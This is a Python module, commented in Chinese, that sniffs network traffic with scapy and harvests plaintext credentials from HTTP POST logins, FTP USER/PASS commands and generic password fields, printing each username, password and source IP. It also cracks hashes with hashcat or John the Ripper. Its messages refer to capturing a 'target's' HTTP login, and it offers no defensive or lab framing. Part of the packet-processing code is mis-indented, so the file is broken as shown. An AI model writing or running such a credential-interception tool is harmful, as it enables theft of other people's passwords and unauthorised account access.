#!/usr/bin/env python3
"""
密碼捕獲和破解模組
捕獲網路中的密碼雜湊，並使用工具進行破解
"""

import subprocess
import hashlib
import re
import urllib.parse
from scapy.all import sniff, IP, TCP, Raw, get_if_list
import threading
import time

class PasswordCapture:
    def __init__(self):
        """初始化密碼捕獲器"""
        self.capturing = False
        self.captured_passwords = []
        self.captured_hashes = []
        self.capture_thread = None
        self.interface = None
        self.packet_count = 0
        self.last_packet_time = None
    
    def _capture_packets(self, interface=None):
        """捕獲資料包並提取密碼"""
        # 用於重組TCP流的字典
        tcp_streams = {}
        
        def process_packet(packet):
            if not self.capturing:
                return
            
            try:
                # 更新統計
                self.packet_count += 1
                self.last_packet_time = time.time()
                
                # 每1000個資料包輸出一次狀態
                if self.packet_count % 1000 == 0:
                    print(f"[*] 已處理 {self.packet_count} 個資料包...")
                
                if not (packet.haslayer(IP) and packet.haslayer(TCP)):
                    return
                
                # 處理HTTP（端口80）、FTP（端口21）和其他可能包含憑證的流量
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # 建立流標識符
                stream_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
                
                if packet.haslayer(Raw):
                    load = packet[Raw].load
                    
                    # 嘗試重組TCP流
                    if stream_id not in tcp_streams:
                        tcp_streams[stream_id] = b''
                    
                    tcp_streams[stream_id] += load
                    
                            # 檢查是否包含完整的HTTP請求
                            try:
                                full_data = tcp_streams[stream_id].decode('utf-8', errors='ignore')
                                
                                # 檢查是否包含HTTP請求結束標記或流太長
                                if '\r\n\r\n' in full_data or len(tcp_streams[stream_id]) > 4096:
                                    # 調試輸出
                                    if 'POST' in full_data:
                                        print(f"[DEBUG] 檢測到POST請求 (長度: {len(full_data)})")
                                        if 'password' in full_data.lower() or 'login' in full_data.lower():
                                            print(f"[DEBUG] POST請求包含登入相關欄位")
                                    
                                    # 檢測HTTP POST請求中的密碼
                                    if 'POST' in full_data and ('password' in full_data.lower() or 'passwd' in full_data.lower() or 'login' in full_data.lower()):
                                        print(f"[+] 嘗試提取HTTP憑證...")
                                        self._extract_http_credentials(full_data, packet)
                                    
                                    # 檢測FTP密碼
                                    if ('USER' in full_data or 'PASS' in full_data) and ('220' in full_data or '331' in full_data or '230' in full_data):
                                        print(f"[+] 嘗試提取FTP憑證...")
                                        self._extract_ftp_credentials(full_data, packet)
                                    
                                    # 檢測其他協定的憑證
                                    self._extract_generic_credentials(full_data, packet)
                                    
                                    # 清理已處理的流
                                    if len(tcp_streams) > 100:
                                        oldest = min(tcp_streams.keys(), key=lambda k: len(tcp_streams[k]))
                                        del tcp_streams[oldest]
                    except:
                        # 如果解碼失敗，嘗試直接處理單個資料包
                        try:
                            load_str = load.decode('utf-8', errors='ignore')
                            if 'POST' in load_str and ('password' in load_str.lower() or 'passwd' in load_str.lower()):
                                self._extract_http_credentials(load_str, packet)
                            if 'USER' in load_str or 'PASS' in load_str:
                                self._extract_ftp_credentials(load_str, packet)
                        except:
                            pass
                else:
                    # 沒有Raw層，清理對應的流
                    if stream_id in tcp_streams and len(tcp_streams) > 50:
                        del tcp_streams[stream_id]
            except Exception as e:
                # 輸出錯誤以便調試
                if self.capturing:
                    print(f"[!] 處理資料包錯誤: {e}")
        
        try:
            # 使用BPF過濾器捕獲HTTP（80）、FTP（21）和其他常見端口
            bpf_filter = "tcp port 80 or tcp port 21 or tcp port 8080"
            
            print(f"[*] 開始捕獲網路流量")
            print(f"[*] 過濾器: {bpf_filter}")
            if interface:
                print(f"[*] 使用網路介面: {interface}")
            print(f"[*] 提示: 確保目標正在使用HTTP進行登入")
            print(f"[*] 提示: 如果沒有看到資料包，請檢查是否有HTTP流量經過此介面")
            
            if interface:
                sniff(iface=interface, filter=bpf_filter, prn=process_packet, 
                      stop_filter=lambda x: not self.capturing, store=False)
            else:
                sniff(filter=bpf_filter, prn=process_packet, 
                      stop_filter=lambda x: not self.capturing, store=False)
        except PermissionError:
            print("[!] 權限錯誤: 需要root權限來捕獲網路流量")
            print("[!] 請使用: sudo python3 main.py")
            self.capturing = False
        except OSError as e:
            if "No such device" in str(e) or "Device not found" in str(e):
                print(f"[!] 網路介面錯誤: {interface} 不存在")
                print("[*] 可用的介面:")
                try:
                    from scapy.all import get_if_list
                    for iface in get_if_list():
                        print(f"  - {iface}")
                except:
                    pass
                self.capturing = False
            else:
                print(f"[!] 密碼捕獲錯誤: {e}")
                self.capturing = False
        except Exception as e:
            print(f"[!] 密碼捕獲錯誤: {e}")
            import traceback
            traceback.print_exc()
            self.capturing = False
    
    def _extract_http_credentials(self, data, packet):
        """從HTTP資料中提取憑證"""
        try:
            # 提取URL編碼的資料
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 嘗試解析URL編碼的資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'type': 'HTTP',
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_passwords:
                        self.captured_passwords.append(credential)
                        print(f"[+] 捕獲HTTP憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 如果解析失敗，使用正則表達式
                username_match = re.search(r'(?:user|username|email|login|userid|account)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'type': 'HTTP',
                        'username': username,
                        'password': password,
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_passwords:
                        self.captured_passwords.append(credential)
                        print(f"[+] 捕獲HTTP憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def _extract_ftp_credentials(self, data, packet):
        """從FTP資料中提取憑證"""
        try:
            if 'USER ' in data:
                username = data.split('USER ')[1].split('\r\n')[0].strip()
                credential = {
                    'type': 'FTP',
                    'username': username,
                    'password': None,
                    'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                    'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                    'timestamp': time.time()
                }
                # 檢查是否已有相同的FTP使用者名
                existing = None
                for cred in self.captured_passwords:
                    if cred['type'] == 'FTP' and cred['username'] == username and cred['password'] is None:
                        existing = cred
                        break
                
                if not existing:
                    self.captured_passwords.append(credential)
            
            if 'PASS ' in data:
                password = data.split('PASS ')[1].split('\r\n')[0].strip()
                # 找到最近的FTP憑證並添加密碼
                for cred in reversed(self.captured_passwords):
                    if cred['type'] == 'FTP' and cred['password'] is None:
                        cred['password'] = password
                        print(f"[+] 捕獲FTP憑證: {cred['username']} / {password} (來源: {cred['source_ip']})")
                        break
        except Exception as e:
            pass
    
    def _extract_generic_credentials(self, data, packet):
        """提取通用格式的憑證"""
        try:
            # 檢測各種常見的憑證格式
            patterns = [
                r'password["\']?\s*[:=]\s*["\']?([^"\'\s\r\n]+)',
                r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s\r\n]+)',
                r'pass["\']?\s*[:=]\s*["\']?([^"\'\s\r\n]+)',
            ]
            
            for pattern in patterns:
                matches = re.finditer(pattern, data, re.IGNORECASE)
                for match in matches:
                    password = match.group(1)
                    if len(password) > 3:  # 過濾太短的匹配
                        credential = {
                            'type': 'Generic',
                            'username': 'N/A',
                            'password': password,
                            'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                            'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                            'timestamp': time.time()
                        }
                        
                        if credential not in self.captured_passwords:
                            self.captured_passwords.append(credential)
        except Exception as e:
            pass
    
    def start(self, interface=None):
        """開始捕獲密碼"""
        if self.capturing:
            return False
        
        try:
            # 如果沒有指定介面，嘗試獲取預設介面
            if not interface:
                interfaces = get_if_list()
                non_loopback = [iface for iface in interfaces if not iface.startswith('lo')]
                if non_loopback:
                    interface = non_loopback[0]
                else:
                    interface = None
            
            self.interface = interface
            self.capturing = True
            self.captured_passwords = []  # 重置捕獲的密碼
            self.packet_count = 0  # 重置計數器
            
            self.capture_thread = threading.Thread(target=self._capture_packets, args=(interface,), daemon=True)
            self.capture_thread.start()
            
            if interface:
                print(f"[+] 密碼捕獲已啟動 (介面: {interface})")
            else:
                print(f"[+] 密碼捕獲已啟動 (所有介面)")
            print("[*] 正在監聽網路流量以捕獲密碼...")
            return True
        except Exception as e:
            print(f"[!] 啟動密碼捕獲錯誤: {e}")
            self.capturing = False
            return False
    
    def stop(self):
        """停止捕獲密碼"""
        if not self.capturing:
            return False
        
        self.capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
        print("[+] 密碼捕獲已停止")
        print(f"[*] 總共處理 {self.packet_count} 個資料包")
        print(f"[*] 總共捕獲 {len(self.captured_passwords)} 組密碼")
        return True
    
    def get_captured_passwords(self):
        """獲取捕獲的密碼"""
        return self.captured_passwords
    
    def crack_hash(self, hash_value, hash_type='md5', wordlist='/usr/share/wordlists/rockyou.txt'):
        """
        使用hashcat或John the Ripper破解雜湊
        
        Args:
            hash_value: 要破解的雜湊值
            hash_type: 雜湊類型 (md5, sha1, sha256, etc.)
            wordlist: 字典檔案路徑
        """
        print(f"[*] 嘗試破解雜湊: {hash_value} (類型: {hash_type})")
        
        # 嘗試使用hashcat
        try:
            hashcat_cmd = [
                'hashcat',
                '-m', self._get_hashcat_mode(hash_type),
                hash_value,
                wordlist,
                '--force'  # 在某些系統上可能需要
            ]
            
            result = subprocess.run(hashcat_cmd, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                # 解析hashcat輸出
                for line in result.stdout.split('\n'):
                    if hash_value in line and ':' in line:
                        cracked = line.split(':')[-1]
                        print(f"[+] 破解成功: {cracked}")
                        return cracked
        except Exception as e:
            print(f"Hashcat錯誤: {e}")
        
        # 嘗試使用John the Ripper
        try:
            # 建立暫存檔案
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.hash') as f:
                f.write(f"{hash_value}\n")
                temp_file = f.name
            
            john_cmd = ['john', '--wordlist=' + wordlist, temp_file]
            result = subprocess.run(john_cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0 or 'password' in result.stdout.lower():
                # 嘗試顯示破解結果
                show_cmd = ['john', '--show', temp_file]
                show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                if show_result.returncode == 0:
                    print(f"[+] 破解結果: {show_result.stdout}")
            
            import os
            os.unlink(temp_file)
        except Exception as e:
            print(f"John the Ripper錯誤: {e}")
        
        return None
    
    def _get_hashcat_mode(self, hash_type):
        """獲取hashcat模式代碼"""
        modes = {
            'md5': '0',
            'sha1': '100',
            'sha256': '1400',
            'sha512': '1700',
            'ntlm': '1000',
            'bcrypt': '3200'
        }
        return modes.get(hash_type.lower(), '0')

